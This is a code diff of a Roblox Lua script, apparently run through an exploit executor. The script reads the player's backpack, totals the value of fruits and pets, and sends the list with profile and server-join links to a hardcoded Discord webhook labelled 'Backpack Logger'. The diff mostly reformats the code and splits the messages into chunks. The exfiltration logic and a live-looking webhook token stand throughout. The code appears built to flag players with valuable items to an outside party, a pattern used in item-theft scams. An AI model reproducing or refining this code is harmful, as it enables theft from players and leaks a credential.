@@ -12,10 +12,10 @@ task.defer(function()
 	local Username = LocalPlayer.Name
 	local ProfileURL = string.format("https://www.roblox.com/users/%d/profile", UserId)
 	local GameLink = string.format("https://www.roblox.com/games/%d?jobId=%s", game.PlaceId, game.JobId)
-	
-    local webhook = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"
 
-    local function waitForModule(path)
+	local webhook = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"
+
+	local function waitForModule(path)
 		local result
 		while not result do
 			pcall(function() result = require(path) end)
@@ -96,117 +96,120 @@ task.defer(function()
 	end
 
 	local function splitTextIntoChunks(baseLines, maxChars)
-    	local chunks = {}
-    	local chunk, charCount = {}, 0
-    
-    	for _, line in ipairs(baseLines) do
-    		local len = #line + 1 -- add newline char
-    		if (charCount + len) > maxChars then
-    			table.insert(chunks, chunk)
-    			chunk, charCount = {}, 0
-    		end
-    		table.insert(chunk, line)
-    		charCount += len
-    	end
-    
-    	if #chunk > 0 then
-    		table.insert(chunks, chunk)
-    	end
-    
-    	return chunks
-    end
-    
-    local function ScanAndSend()
-    	local fruitLines = {
-    		"🍎 Fruits            | Value",
-    		"---------------------|--------"
-    	}
-    	local petLines = {
-    		"🐾 Pets              | Value",
-    		"---------------------|--------"
-    	}
-    
-    	local totalValue = 0
-    
-    	for _, tool in ipairs(Backpack:GetChildren()) do
-    		if tool:IsA("Tool") then
-    			local name = GetCleanName(tool.Name)
-    			local value = 0
-    
-    			if tool:FindFirstChild("Item_String") then
-    				value = CalculatePlantValue(tool)
-    				if value > 0 then
-    					totalValue += value
-    					local padded = name .. string.rep(" ", math.max(0, 21 - #name))
-    					table.insert(fruitLines, padded .. "| $" .. FormatNumber(value))
-    				end
-    			elseif tool:GetAttribute("ItemType") == "Pet" then
-    				value = CalculatePetValue(tool)
-    				if value > 0 then
-    					totalValue += value
-    					local padded = name .. string.rep(" ", math.max(0, 21 - #name))
-    					table.insert(petLines, padded .. "| $" .. FormatNumber(value))
-    				end
-    			end
-    		end
-    	end
-    
-    	if #fruitLines == 2 and #petLines == 2 then
-    		warn("❌ No valuable items found.")
-    		return
-    	end
-    
-    	local contentLines = {}
-    
-    	if #fruitLines > 2 then
-    		for _, line in ipairs(fruitLines) do table.insert(contentLines, line) end
-    		table.insert(contentLines, "")
-    	end
-    	if #petLines > 2 then
-    		for _, line in ipairs(petLines) do table.insert(contentLines, line) end
-    		table.insert(contentLines, "")
-    	end
-    
-    	table.insert(contentLines, "Total Backpack Value: $" .. FormatNumber(totalValue))
-    
-    	local messageChunks = splitTextIntoChunks(contentLines, 1900) -- 1900 for buffer
-    
-    	local embeds = {}
-    	for i, chunk in ipairs(messageChunks) do
-    		local desc = string.format(
-    			"✅ [Join Server](https://www.roblox.com/games/%s?jobId=%s)\n🔗 [View Profile](https://www.roblox.com/users/%s/profile)\n```txt\n%s\n```",
-    			game.PlaceId,
-    			game.JobId,
-    			LocalPlayer.UserId,
-    			table.concat(chunk, "\n")
-    		)
-    
-    		table.insert(embeds, {
-    			title = LocalPlayer.Name .. "'s Backpack" .. (#messageChunks > 1 and (" (Page " .. i .. ")") or ""),
-    			description = desc,
-    			color = 0x00ff99,
-    			timestamp = DateTime.now():ToIsoDate()
-    		})
-    	end
-    
-    	local payload = HttpService:JSONEncode({ username = "Backpack Logger", embeds = embeds })
-    
-    	local success, result = pcall(function()
-    		return req({
-    			Url = webhook,
-    			Method = "POST",
-    			Headers = {["Content-Type"] = "application/json"},
-    			Body = payload
-    		})
-    	end)
-    
-    	if success then
-    		print("✅ Sent to Discord.")
-    	else
-    		warn("❌ Webhook failed:", result)
-    	end
-    end
+		local chunks = {}
+		local chunk, charCount = {}, 0
 
+		for _, line in ipairs(baseLines) do
+			local len = #line + 1
+			if (charCount + len) > maxChars then
+				table.insert(chunks, chunk)
+				chunk, charCount = {}, 0
+			end
+			table.insert(chunk, line)
+			charCount += len
+		end
+
+		if #chunk > 0 then
+			table.insert(chunks, chunk)
+		end
+
+		return chunks
+	end
+
+	local function ScanAndSend()
+		local fruitLines = {
+			"🍎 Fruits            | Value",
+			"---------------------|--------"
+		}
+		local petLines = {
+			"🐾 Pets              | Value",
+			"---------------------|--------"
+		}
+
+		local totalValue = 0
+
+		for _, tool in ipairs(Backpack:GetChildren()) do
+			if tool:IsA("Tool") then
+				local name = GetCleanName(tool.Name)
+				local value = 0
+
+				if tool:FindFirstChild("Item_String") then
+					value = CalculatePlantValue(tool)
+					if value > 0 then
+						totalValue += value
+						local padded = name .. string.rep(" ", math.max(0, 21 - #name))
+						table.insert(fruitLines, padded .. "| $" .. FormatNumber(value))
+					end
+				elseif tool:GetAttribute("ItemType") == "Pet" then
+					value = CalculatePetValue(tool)
+					if value > 0 then
+						totalValue += value
+						local padded = name .. string.rep(" ", math.max(0, 21 - #name))
+						table.insert(petLines, padded .. "| $" .. FormatNumber(value))
+					end
+				end
+			end
+		end
+
+		if #fruitLines == 2 and #petLines == 2 then
+			warn("❌ No valuable items found.")
+			return
+		end
+
+		local contentLines = {}
+
+		if #fruitLines > 2 then
+			for _, line in ipairs(fruitLines) do table.insert(contentLines, line) end
+			table.insert(contentLines, "")
+		end
+		if #petLines > 2 then
+			for _, line in ipairs(petLines) do table.insert(contentLines, line) end
+			table.insert(contentLines, "")
+		end
+
+		table.insert(contentLines, "💰 Total Backpack Value: $" .. FormatNumber(totalValue))
+
+		local messageChunks = splitTextIntoChunks(contentLines, 1800) -- slightly under Discord limit
+
+		-- send each chunk as its own embed/message
+		task.spawn(function()
+			for i, chunk in ipairs(messageChunks) do
+				local desc = string.format(
+					"✅ [Join Server](%s)\n🔗 [View Profile](%s)\n```txt\n%s\n```",
+					GameLink,
+					ProfileURL,
+					table.concat(chunk, "\n")
+				)
+
+				local payload = HttpService:JSONEncode({
+					username = "Backpack Logger",
+					embeds = {{
+						title = string.format("%s's Backpack (%d/%d)", Username, i, #messageChunks),
+						description = desc,
+						color = 0x00ff99,
+						timestamp = DateTime.now():ToIsoDate()
+					}}
+				})
+
+				local success, result = pcall(function()
+					return req({
+						Url = webhook,
+						Method = "POST",
+						Headers = {["Content-Type"] = "application/json"},
+						Body = payload
+					})
+				end)
+
+				if success then
+					print("✅ Sent chunk", i)
+				else
+					warn("❌ Failed to send chunk", i, result)
+				end
+
+				task.wait(1) -- prevent rate limits
+			end
+		end)
+	end
 
 	task.wait(2)
 	ScanAndSend()
